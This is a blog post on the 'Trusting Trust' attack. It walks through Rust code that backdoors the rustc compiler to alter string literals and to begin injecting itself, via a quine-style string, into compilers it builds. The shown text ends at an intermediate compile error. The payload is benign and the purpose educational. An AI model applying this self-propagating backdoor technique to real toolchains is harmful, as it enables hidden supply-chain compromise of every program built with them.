
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Reflections on Rusting Trust - In Pursuit of Laziness</title>
  <meta name="author" content="Manish Goregaokar">

  
  <meta name="description" content="The Rust compiler is written in Rust. This is overall a pretty common practice in compiler
development. This usually means that the process of &hellip;">
  
  <!-- Tweaked https://harimenon.com/blog/2013/02/23/twitter-cards-for-octopress-blogs/ -->
  
      <meta property="twitter:card" content="summary">
      <meta property="twitter:site" content="Manishearth">
      <meta property="twitter:url" content="http://manishearth.github.io">
      <meta property="twitter:title" content="Reflections on Rusting Trust">
      <meta property="twitter:description" content="The Rust compiler is written in Rust. This is overall a pretty common practice in compiler
development. This usually means that the process of building the compiler involves downloading a
(typically &hellip;">
      <meta name="twitter:image" content="http://manishearth.github.io/images/me.png" />
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://manishearth.github.io/blog/2016/12/02/reflections-on-rusting-trust/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/stylesheets/data-table.css" media="screen, projection" rel="stylesheet" type="text/css" />
  <link href="/stylesheets/custom.css" media="screen, projection" rel="stylesheet" type="text/css" />
  <link href="/atom.xml" rel="alternate" title="In Pursuit of Laziness" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <script src="/javascripts/manish.js" type="text/javascript"></script>
  <!--- MathJax Configuration -->
  
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-62537162-1']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">In Pursuit of Laziness</a></h1>
  
    <h2>Manish Goregaokar's blog</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="manishearth.github.io">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Reflections on Rusting Trust</h1>
    
    
      <p class="meta">
        





        
      </p>
    
  </header>


<div class="entry-content"><p>The Rust compiler is written in Rust. This is overall a pretty common practice in compiler
development. This usually means that the process of building the compiler involves downloading a
(typically) older version of the compiler.</p>

<p>This also means that the compiler is vulnerable to what is colloquially known as the “Trusting
Trust” attack, an attack described in <a href="https://www.ece.cmu.edu/~ganger/712.fall02/papers/p761-thompson.pdf">Ken Thompson’s acceptance speech for the 1983 Turing Award</a>.
This kind of thing fascinates me, so I decided to try writing one myself. It’s stuff like this which
started my interest in compilers, and I hope this post can help get others interested the same way.</p>

<p>To be clear, this isn’t an indictment of Rust’s security. Quite a few languages out there have
popular self-hosted compilers (C, C++, Haskell, Scala, D, Go) and are vulnerable to this attack. For
this attack to have any effect, one needs to be able to uniformly distribute this compiler, and
there are roughly equivalent ways of doing the same level of damage with that kind of access.</p>

<p>If you already know what a trusting trust attack is, you can skip the next section. If you just want
to see the code, it’s in the <a href="https://github.com/Manishearth/rust/tree/rusting-trust">trusting-trust branch</a> on my Rust fork, specifically
<a href="https://github.com/Manishearth/rust/blob/rusting-trust/src/librustc_driver/driver.rs#L541">this code</a>.</p>

<h2 id="the-attack">The attack</h2>

<p>The essence of the attack is this:</p>

<p>An attacker can conceivably change a compiler such that it can detect a particular kind of application and
make malicious changes to it. The example given in the talk was the UNIX <code class="language-plaintext highlighter-rouge">login</code> program — the attacker
can tweak a compiler so as to detect that it is compiling the <code class="language-plaintext highlighter-rouge">login</code> program, and compile in a
backdoor that lets it unconditionally accept a special password (created by the attacker) for any
user, thereby giving the attacker access to all accounts on all systems that have <code class="language-plaintext highlighter-rouge">login</code> compiled
by their modified compiler.</p>

<p>However, this change would be detected in the source. If it was not included in the source, this
change would disappear in the next release of the compiler, or when someone else compiles the
compiler from source. Avoiding this attack is easily done by compiling your own compilers and not
downloading untrusted binaries. This is good advice in general regarding untrusted binaries, and it
equally applies here.</p>

<p>To counter this, the attacker can go one step further. If they can tweak the compiler so as to
backdoor <code class="language-plaintext highlighter-rouge">login</code>, they could also tweak the compiler so as to backdoor itself. The attacker needs to
modify the compiler with a backdoor which detects when it is compiling the same compiler, and
introduces <em>itself</em> into the compiler that it is compiling. On top of this it can also introduce
backdoors into <code class="language-plaintext highlighter-rouge">login</code> or whatever other program the attacker is interested in.</p>

<p>Now, in this case, even if the backdoor is removed from the source, <em>every compiler compiled using
this backdoored compiler will be similarly backdoored</em>. So if this backdoored compiler somehow
starts getting distributed, it will spread itself as it is used to compile more copies of itself
(e.g. newer versions, etc). And it will be virtually undetectable — since the source doesn’t
need to be modified for it to work; just the non-human-readable binary.</p>

<p>Of course, there are ways to protect against this. Ultimately, before a compiler for language X
existed, that compiler had to be written in some other language Y. If you can track the sources back
to that point you can bootstrap a working compiler from scratch and keep compiling newer compiler
versions till you reach the present. This raises the question of whether or not Y’s compiler is
backdoored. While it sounds pretty unlikely that such a backdoor could be so robust as to work on
two different compilers and stay put throughout the history of X, you can of course trace back Y
back to other languages and so on till you find a compiler in assembly that you can verify<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote">1</a></sup>.</p>

<h2 id="backdooring-rust">Backdooring Rust</h2>

<p>Alright, so I want to backdoor my compiler. I first have to decide when in the pipeline the code
that insert backdoors executes. The Rust compiler operates by taking source code, parsing it into a
syntax tree (AST), transforming it into some intermediate representations (HIR and MIR), and feeding
it to LLVM in the form of LLVM IR, after which LLVM does its thing and creates binaries. A backdoor
can be inserted at any point in this stage. To me, it seems like it’s easier to insert one into the
AST, because it’s easier to obtain AST from source, and this is important as we’ll see soon. It also
makes this attack less practically viable<sup id="fnref:5" role="doc-noteref"><a href="#fn:5" class="footnote">2</a></sup>, which is nice since this is just a fun exercise and I
don’t actually want to backdoor the compiler.</p>

<p>So the moment the compiler finishes parsing, my code will modify the AST to insert a backdoor.</p>

<p>First, I’ll try to write a simpler backdoor; one which doesn’t affect the compiler but instead
affects some programs. I shall write a backdoor that replaces occurrences of the string “hello world”
with “जगाला नमस्कार”, a rough translation of the same in my native language.</p>

<p>Now, in rustc, the <code class="language-plaintext highlighter-rouge">rustc_driver</code> crate is where the whole process of compiling is coordinated. In particular,
<a href="https://github.com/rust-lang/rust/blob/1cabe2151299c63497abc3a20bd08c04c0cd32a3/src/librustc_driver/driver.rs#L546"><code class="language-plaintext highlighter-rouge">phase_2_configure_and_expand</code></a> is run right after parsing (which is <a href="https://github.com/rust-lang/rust/blob/1cabe2151299c63497abc3a20bd08c04c0cd32a3/src/librustc_driver/driver.rs#L485">phase 1</a>). Perfect.
Within that function, the <code class="language-plaintext highlighter-rouge">krate</code> variable contains the parsed AST for the crate<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote">3</a></sup>, and we need to modify that.</p>

<p>In this case, there’s already machinery in <a href="http://manishearth.github.io/rust-internals-docs/syntax/fold/"><code class="language-plaintext highlighter-rouge">syntax::fold</code></a> for mutating ASTs based on patterns. A
<a href="http://manishearth.github.io/rust-internals-docs/syntax/fold/trait.Folder.html"><code class="language-plaintext highlighter-rouge">Folder</code></a> basically has the ability to walk the AST, producing a mirror AST, with modifications. For
each kind of node, you get to specify a function which will produce a node to be used in its place.
Most such functions will default to no-op (returning the same node).</p>

<p>So I write the following <code class="language-plaintext highlighter-rouge">Folder</code>:</p>

<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">// Understanding the minute details of this code isn't important; it is a bit complex</span>
<span class="c">// since the API used here isn't meant to be used this way. Focus on the comments.</span>

<span class="k">mod</span> <span class="n">trust</span> <span class="p">{</span>
    <span class="k">use</span> <span class="nn">syntax</span><span class="p">::</span><span class="nn">fold</span><span class="p">::</span><span class="o">*</span><span class="p">;</span>
    <span class="k">use</span> <span class="nn">syntax</span><span class="p">::</span><span class="nn">ast</span><span class="p">::</span><span class="o">*</span><span class="p">;</span>
    <span class="k">use</span> <span class="nn">syntax</span><span class="p">::</span><span class="nn">parse</span><span class="p">::</span><span class="nn">token</span><span class="p">::</span><span class="n">InternedString</span><span class="p">;</span>
    <span class="k">use</span> <span class="nn">syntax</span><span class="p">::</span><span class="nn">ptr</span><span class="p">::</span><span class="n">P</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">TrustFolder</span><span class="p">;</span>

    <span class="c">// The trait contains default impls which we override for specific cases</span>
    <span class="k">impl</span> <span class="n">Folder</span> <span class="k">for</span> <span class="n">TrustFolder</span> <span class="p">{</span>
        <span class="c">// every time we come across an expression, run this function</span>
        <span class="c">// on it and replace it with the produced expression in the tree</span>
        <span class="k">fn</span> <span class="nf">fold_expr</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="k">self</span><span class="p">,</span> <span class="n">expr</span><span class="p">:</span> <span class="n">P</span><span class="o">&lt;</span><span class="n">Expr</span><span class="o">&gt;</span><span class="p">)</span> <span class="k">-&gt;</span> <span class="n">P</span><span class="o">&lt;</span><span class="n">Expr</span><span class="o">&gt;</span> <span class="p">{</span>
            <span class="c">// The peculiar `.map` pattern needs to be used here</span>
            <span class="c">// because of the way AST nodes are stored in immutable</span>
            <span class="c">// `P&lt;T&gt;` pointers. The AST is not typically mutated.</span>
            <span class="n">expr</span><span class="nf">.map</span><span class="p">(|</span><span class="k">mut</span> <span class="n">expr</span><span class="p">|</span> <span class="p">{</span>
                <span class="k">match</span> <span class="n">expr</span><span class="py">.node</span> <span class="p">{</span>
                    <span class="nn">ExprKind</span><span class="p">::</span><span class="nf">Lit</span><span class="p">(</span><span class="k">ref</span> <span class="k">mut</span> <span class="n">l</span><span class="p">)</span> <span class="k">=&gt;</span> <span class="p">{</span>
                        <span class="o">*</span><span class="n">l</span> <span class="o">=</span> <span class="n">l</span><span class="nf">.clone</span><span class="p">()</span><span class="nf">.map</span><span class="p">(|</span><span class="k">mut</span> <span class="n">l</span><span class="p">|</span> <span class="p">{</span>
                            <span class="c">// look for string literals</span>
                            <span class="k">if</span> <span class="k">let</span> <span class="nn">LitKind</span><span class="p">::</span><span class="nf">Str</span><span class="p">(</span><span class="k">ref</span> <span class="k">mut</span> <span class="n">s</span><span class="p">,</span> <span class="mi">_</span><span class="p">)</span> <span class="o">=</span> <span class="n">l</span><span class="py">.node</span> <span class="p">{</span>
                                <span class="c">// replace their contents</span>
                                <span class="k">if</span> <span class="n">s</span> <span class="o">==</span> <span class="s">"hello world"</span> <span class="p">{</span>
                                    <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="nn">InternedString</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="s">"जगाला नमस्कार"</span><span class="p">);</span>
                                <span class="p">}</span>
                            <span class="p">}</span>
                            <span class="n">l</span>
                        <span class="p">})</span>
                    <span class="p">}</span>
                    <span class="mi">_</span> <span class="k">=&gt;</span> <span class="p">()</span>
                <span class="p">}</span>
                <span class="c">// recurse down expression with the default fold</span>
                <span class="nf">noop_fold_expr</span><span class="p">(</span><span class="n">expr</span><span class="p">,</span> <span class="k">self</span><span class="p">)</span>
            <span class="p">})</span>
        <span class="p">}</span>
        <span class="k">fn</span> <span class="nf">fold_mac</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="k">self</span><span class="p">,</span> <span class="n">mac</span><span class="p">:</span> <span class="n">Mac</span><span class="p">)</span> <span class="k">-&gt;</span> <span class="n">Mac</span> <span class="p">{</span>
            <span class="c">// Folders are not typically supposed to operate on pre-macro-expansion ASTs</span>
            <span class="c">// and will by default panic here. We must explicitly specify otherwise.</span>
            <span class="nf">noop_fold_mac</span><span class="p">(</span><span class="n">mac</span><span class="p">,</span> <span class="k">self</span><span class="p">)</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="c">// our entry point</span>
    <span class="k">pub</span> <span class="k">fn</span> <span class="nf">fold_crate</span><span class="p">(</span><span class="n">krate</span><span class="p">:</span> <span class="n">Crate</span><span class="p">)</span> <span class="k">-&gt;</span> <span class="n">Crate</span> <span class="p">{</span>
        <span class="c">// make a folder, fold the crate with it</span>
        <span class="n">TrustFolder</span><span class="nf">.fold_crate</span><span class="p">(</span><span class="n">krate</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>I invoke it by calling <code class="language-plaintext highlighter-rouge">let krate = trust::fold_crate(krate);</code> as the first line of <code class="language-plaintext highlighter-rouge">phase_2_configure_and_expand</code>.</p>

<p>I create a stage 1 build<sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote">4</a></sup> of rustc (<code class="language-plaintext highlighter-rouge">make rustc-stage1</code>). I’ve already set up <code class="language-plaintext highlighter-rouge">rustup</code> to have a “stage1” toolchain
pointing to this folder (<code class="language-plaintext highlighter-rouge">rustup toolchain link stage1 /path/to/rust/target_triple/stage1</code>), so I can easily test this new compiler:</p>

<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">// test.rs</span>
<span class="k">fn</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">let</span> <span class="n">x</span> <span class="o">=</span> <span class="s">"hello world"</span><span class="p">;</span>
    <span class="nd">println!</span><span class="p">(</span><span class="s">"{}"</span><span class="p">,</span> <span class="n">x</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rustup run stage1 rustc test.rs
<span class="nv">$ </span>./test
जगाला नमस्कार
</code></pre></div></div>

<p>Note that I had the string on a separate line instead of directly doing <code class="language-plaintext highlighter-rouge">println!("hello world")</code>.
This is because our backdoor isn’t perfect; it applies to the <em>pre-expansion</em> AST. In this AST,
<code class="language-plaintext highlighter-rouge">println!</code> is stored as a macro and the <code class="language-plaintext highlighter-rouge">"hello world"</code> is part of the macro token tree; and has not
yet been turned into an expression. Our folder ignores it. It is not too hard to perform this same attack
post-expansion, however.</p>

<p>So far, so good. We have a compiler that tweaks “hello world” strings. Now, let’s see if we can get
it to miscompile itself. This means that our compiler, when compiling a pristine Rust source tree,
should produce a compiler that is similarly backdoored (with the <code class="language-plaintext highlighter-rouge">trust</code> module and the
<code class="language-plaintext highlighter-rouge">trust::fold_crate()</code> call).</p>

<p>We need to tweak our folder so that it does two things:</p>

<ul>
  <li>Inserts the <code class="language-plaintext highlighter-rouge">let krate = trust::fold_crate(krate);</code> statement in the appropriate function (<code class="language-plaintext highlighter-rouge">phase_2_configure_and_expand</code>) when compiling a pristine Rust source tree</li>
  <li>Inserts the <code class="language-plaintext highlighter-rouge">trust</code> module</li>
</ul>

<p>The former is relatively easy. We need to construct an AST for that statement (can be done by
invoking the parser again and extracting the node). The latter is where it gets tricky. We can
encode instructions for outputting the AST of the <code class="language-plaintext highlighter-rouge">trust</code> module, but these instructions themselves
are within the same module, so the instructions for outputting <em>these</em> instructions need to be
included, and so on. This clearly isn’t viable.</p>

<p>However, there’s a way around this. It’s a common trick used in writing <a href="https://en.wikipedia.org/wiki/Quine_(computing)">quines</a>, which face similar
issues. The idea is to put the entire block of code in a string. We then construct the code for the
module by doing something like</p>

<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">mod</span> <span class="n">trust</span> <span class="p">{</span>
    <span class="k">static</span> <span class="n">SELF_STRING</span><span class="p">:</span> <span class="o">&amp;</span><span class="nv">'static</span> <span class="nb">str</span> <span class="o">=</span> <span class="s">"/* stringified contents of this module except for this line */"</span><span class="p">;</span>
    <span class="c">// ..</span>
    <span class="k">fn</span> <span class="nf">fold_mod</span><span class="p">(</span><span class="o">..</span><span class="p">)</span> <span class="p">{</span>
        <span class="c">// ..</span>
        <span class="c">// this produces a string that is the same as the code for the module containing it</span>
        <span class="c">// SELF_STRING is used twice, once to produce the string literal for SELF_STRING, and</span>
        <span class="c">// once to produce the code for the module</span>
        <span class="k">let</span> <span class="n">code_for_module</span> <span class="o">=</span> <span class="s">"mod trust { static SELF_STRING: &amp;'static str = </span><span class="se">\"</span><span class="s">"</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">"</span><span class="se">\"</span><span class="s">;"</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">"}"</span><span class="p">;</span>
        <span class="nf">insert_into_crate</span><span class="p">(</span><span class="n">code_for_module</span><span class="p">);</span>
        <span class="c">// ..</span>
    <span class="p">}</span>
    <span class="c">// ..</span>
<span class="p">}</span>
</code></pre></div></div>

<p>With the code of the module entered in, this will look something like</p>

<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">mod</span> <span class="n">trust</span> <span class="p">{</span>
    <span class="k">static</span> <span class="n">SELF_STRING</span><span class="p">:</span> <span class="o">&amp;</span><span class="nv">'static</span> <span class="nb">str</span> <span class="o">=</span> <span class="s">"
        // .. 
        fn fold_mod(..) {
            // ..
            // this produces a string that is the same as the code for the module containing it
            // SELF_STRING is used twice, once to produce the string literal for SELF_STRING, and
            // once to produce the code for the module
            let code_for_module = </span><span class="se">\"</span><span class="s">mod trust { static SELF_STRING: &amp;'static str = </span><span class="se">\\\"\"</span><span class="s"> + SELF_STRING + </span><span class="se">\"\\\"</span><span class="s">;</span><span class="se">\"</span><span class="s"> + SELF_STRING + </span><span class="se">\"</span><span class="s">}</span><span class="se">\"</span><span class="s">;
            insert_into_crate(code_for_module);
            // ..
        }
        // ..
    "</span><span class="p">;</span>

    <span class="c">// ..</span>
    <span class="k">fn</span> <span class="nf">fold_mod</span><span class="p">(</span><span class="o">..</span><span class="p">)</span> <span class="p">{</span>
        <span class="c">// ..</span>
        <span class="c">// this produces a string that is the same as the code for the module containing it</span>
        <span class="c">// SELF_STRING is used twice, once to produce the string literal for SELF_STRING, and</span>
        <span class="c">// once to produce the code for the module</span>
        <span class="k">let</span> <span class="n">code_for_module</span> <span class="o">=</span> <span class="s">"mod trust { static SELF_STRING: &amp;'static str = </span><span class="se">\"</span><span class="s">"</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">"</span><span class="se">\"</span><span class="s">;"</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">"}"</span><span class="p">;</span>
        <span class="nf">insert_into_crate</span><span class="p">(</span><span class="n">code_for_module</span><span class="p">);</span>
        <span class="c">// ..</span>
    <span class="p">}</span>
    <span class="c">// ..</span>
<span class="p">}</span>
</code></pre></div></div>

<p>So you have a string containing the contents of the module, except for itself. You build the code
for the module by using the string twice – once to construct the code for the declaration of the
string, and once to construct the code for the rest of the module. Now, by parsing this, you’ll get
the original AST!</p>

<p>Let’s try this step by step. Let’s first see if injecting an arbitrary string (<code class="language-plaintext highlighter-rouge">use foo::bar::blah</code>)
works, without worrying about this cyclical quineyness:</p>

<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">mod</span> <span class="n">trust</span> <span class="p">{</span>
    <span class="c">// dummy string just to see if it gets injected</span>
    <span class="c">// inserting the full code of this module has some practical concerns</span>
    <span class="c">// about escaping which I'll address later</span>
    <span class="k">static</span> <span class="n">SELF_STRING</span><span class="p">:</span> <span class="o">&amp;</span><span class="nv">'static</span> <span class="nb">str</span> <span class="o">=</span> <span class="s">"use foo::bar::blah;"</span><span class="p">;</span>
    <span class="k">use</span> <span class="nn">syntax</span><span class="p">::</span><span class="nn">fold</span><span class="p">::</span><span class="o">*</span><span class="p">;</span>
    <span class="k">use</span> <span class="nn">syntax</span><span class="p">::</span><span class="nn">ast</span><span class="p">::</span><span class="o">*</span><span class="p">;</span>
    <span class="k">use</span> <span class="nn">syntax</span><span class="p">::</span><span class="nn">parse</span><span class="p">::</span><span class="n">parse_crate_from_source_str</span><span class="p">;</span>
    <span class="k">use</span> <span class="nn">syntax</span><span class="p">::</span><span class="nn">parse</span><span class="p">::</span><span class="nn">token</span><span class="p">::</span><span class="n">InternedString</span><span class="p">;</span>
    <span class="k">use</span> <span class="nn">syntax</span><span class="p">::</span><span class="nn">ptr</span><span class="p">::</span><span class="n">P</span><span class="p">;</span>
    <span class="k">use</span> <span class="nn">syntax</span><span class="p">::</span><span class="nn">util</span><span class="p">::</span><span class="nn">move_map</span><span class="p">::</span><span class="n">MoveMap</span><span class="p">;</span>
    <span class="k">use</span> <span class="nn">rustc</span><span class="p">::</span><span class="nn">session</span><span class="p">::</span><span class="n">Session</span><span class="p">;</span>

    <span class="k">struct</span> <span class="n">TrustFolder</span><span class="o">&lt;</span><span class="nv">'a</span><span class="o">&gt;</span> <span class="p">{</span>
        <span class="c">// we need the session to be able to parse things. No biggie.</span>
        <span class="n">sess</span><span class="p">:</span> <span class="o">&amp;</span><span class="nv">'a</span> <span class="n">Session</span><span class="p">,</span>
    <span class="p">}</span>

    <span class="k">impl</span><span class="o">&lt;</span><span class="nv">'a</span><span class="o">&gt;</span> <span class="n">Folder</span> <span class="k">for</span> <span class="n">TrustFolder</span><span class="o">&lt;</span><span class="nv">'a</span><span class="o">&gt;</span> <span class="p">{</span>
        <span class="k">fn</span> <span class="nf">fold_expr</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="k">self</span><span class="p">,</span> <span class="n">expr</span><span class="p">:</span> <span class="n">P</span><span class="o">&lt;</span><span class="n">Expr</span><span class="o">&gt;</span><span class="p">)</span> <span class="k">-&gt;</span> <span class="n">P</span><span class="o">&lt;</span><span class="n">Expr</span><span class="o">&gt;</span> <span class="p">{</span>
            <span class="n">expr</span><span class="nf">.map</span><span class="p">(|</span><span class="k">mut</span> <span class="n">expr</span><span class="p">|</span> <span class="p">{</span>
                <span class="k">match</span> <span class="n">expr</span><span class="py">.node</span> <span class="p">{</span>
                    <span class="nn">ExprKind</span><span class="p">::</span><span class="nf">Lit</span><span class="p">(</span><span class="k">ref</span> <span class="k">mut</span> <span class="n">l</span><span class="p">)</span> <span class="k">=&gt;</span> <span class="p">{</span>
                        <span class="o">*</span><span class="n">l</span> <span class="o">=</span> <span class="n">l</span><span class="nf">.clone</span><span class="p">()</span><span class="nf">.map</span><span class="p">(|</span><span class="k">mut</span> <span class="n">l</span><span class="p">|</span> <span class="p">{</span>
                            <span class="k">if</span> <span class="k">let</span> <span class="nn">LitKind</span><span class="p">::</span><span class="nf">Str</span><span class="p">(</span><span class="k">ref</span> <span class="k">mut</span> <span class="n">s</span><span class="p">,</span> <span class="mi">_</span><span class="p">)</span> <span class="o">=</span> <span class="n">l</span><span class="py">.node</span> <span class="p">{</span>
                                <span class="k">if</span> <span class="n">s</span> <span class="o">==</span> <span class="s">"hello world"</span> <span class="p">{</span>
                                    <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="nn">InternedString</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="s">"जगाला नमस्कार"</span><span class="p">);</span>
                                <span class="p">}</span>
                            <span class="p">}</span>
                            <span class="n">l</span>
                        <span class="p">})</span>
                    <span class="p">}</span>
                    <span class="mi">_</span> <span class="k">=&gt;</span> <span class="p">()</span>
                <span class="p">}</span>
                <span class="nf">noop_fold_expr</span><span class="p">(</span><span class="n">expr</span><span class="p">,</span> <span class="k">self</span><span class="p">)</span>
            <span class="p">})</span>
        <span class="p">}</span>
        <span class="k">fn</span> <span class="nf">fold_mod</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="k">self</span><span class="p">,</span> <span class="n">m</span><span class="p">:</span> <span class="n">Mod</span><span class="p">)</span> <span class="k">-&gt;</span> <span class="n">Mod</span> <span class="p">{</span>
            <span class="c">// move_flat_map takes a vector, constructs a new one by operating</span>
            <span class="c">// on each element by-move. Again, needed because of `P&lt;T&gt;`</span>
            <span class="k">let</span> <span class="n">new_items</span> <span class="o">=</span> <span class="n">m</span><span class="py">.items</span><span class="nf">.move_flat_map</span><span class="p">(|</span><span class="n">item</span><span class="p">|</span> <span class="p">{</span>
                <span class="c">// we want to modify this function, and give it a sibling from SELF_STRING</span>
                <span class="k">if</span> <span class="n">item</span><span class="py">.ident.name</span><span class="nf">.as_str</span><span class="p">()</span> <span class="o">==</span> <span class="s">"phase_2_configure_and_expand"</span> <span class="p">{</span>
                    <span class="c">// parse SELF_STRING</span>
                    <span class="k">let</span> <span class="n">new_crate</span> <span class="o">=</span> <span class="nf">parse_crate_from_source_str</span><span class="p">(</span><span class="s">"trust"</span><span class="nf">.into</span><span class="p">(),</span>
                                                                <span class="n">SELF_STRING</span><span class="nf">.into</span><span class="p">(),</span>
                                                                <span class="o">&amp;</span><span class="k">self</span><span class="py">.sess.parse_sess</span><span class="p">)</span><span class="nf">.unwrap</span><span class="p">();</span>
                    <span class="c">// extract the first item contained in it, which is the use statement</span>
                    <span class="k">let</span> <span class="n">inner_item</span> <span class="o">=</span> <span class="n">new_crate</span><span class="py">.module.items</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="nf">.clone</span><span class="p">();</span>

                    <span class="c">// move_flat_map needs an iterator of items to insert</span>
                    <span class="nd">vec!</span><span class="p">[</span><span class="n">inner_item</span><span class="p">,</span> <span class="n">item</span><span class="p">]</span><span class="nf">.into_iter</span><span class="p">()</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="nd">vec!</span><span class="p">[</span><span class="n">item</span><span class="p">]</span><span class="nf">.into_iter</span><span class="p">()</span>
                <span class="p">}</span>
            <span class="p">});</span>
            <span class="k">let</span> <span class="n">m</span> <span class="o">=</span> <span class="n">Mod</span> <span class="p">{</span>
                <span class="n">inner</span><span class="p">:</span> <span class="n">m</span><span class="py">.inner</span><span class="p">,</span>
                <span class="n">items</span><span class="p">:</span> <span class="n">new_items</span><span class="p">,</span>
            <span class="p">};</span>
            <span class="nf">noop_fold_mod</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="k">self</span><span class="p">)</span>
        <span class="p">}</span>
        <span class="k">fn</span> <span class="nf">fold_mac</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="k">self</span><span class="p">,</span> <span class="mi">_</span><span class="n">mac</span><span class="p">:</span> <span class="n">Mac</span><span class="p">)</span> <span class="k">-&gt;</span> <span class="n">Mac</span> <span class="p">{</span>
            <span class="nf">noop_fold_mac</span><span class="p">(</span><span class="mi">_</span><span class="n">mac</span><span class="p">,</span> <span class="k">self</span><span class="p">)</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">pub</span> <span class="k">fn</span> <span class="nf">fold_crate</span><span class="p">(</span><span class="n">krate</span><span class="p">:</span> <span class="n">Crate</span><span class="p">,</span> <span class="n">sess</span><span class="p">:</span> <span class="o">&amp;</span><span class="n">Session</span><span class="p">)</span> <span class="k">-&gt;</span> <span class="n">Crate</span> <span class="p">{</span>
        <span class="k">let</span> <span class="k">mut</span> <span class="n">folder</span> <span class="o">=</span> <span class="n">TrustFolder</span> <span class="p">{</span><span class="n">sess</span><span class="p">:</span> <span class="n">sess</span><span class="p">};</span>
        <span class="n">folder</span><span class="nf">.fold_crate</span><span class="p">(</span><span class="n">krate</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>We also change the original call in <code class="language-plaintext highlighter-rouge">phase_2_configure_and_expand</code> to <code class="language-plaintext highlighter-rouge">let krate = trust::fold_crate(krate, sess);</code></p>

<p>Compiling with <code class="language-plaintext highlighter-rouge">make rustc-stage2</code> (we now want the backdoored stage1 compiler to try and compile
the same sources and fudge the <code class="language-plaintext highlighter-rouge">phase_2_configure_and_expand</code> function the second time around), gets us this error:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rustc: x86_64-apple-darwin/stage1/lib/rustlib/x86_64-apple-darwin/lib/librustc_driver
error[E0432]: unresolved import `foo::bar::blah`
 --&gt; trust:1:5
  |
1 | use foo::bar::blah;
  |     ^^^^^^^^^^^^^^ Maybe a missing `extern crate foo;`?

error: aborting due to previous error
</code></pre></div></div>

<p>This is exactly what we expected! We inserted the code <code class="language-plaintext highlighter-rouge">use foo::bar::blah;</code>, which isn’t going to
resolve, and thus got a failure when compiling the crate the second time around.</p>

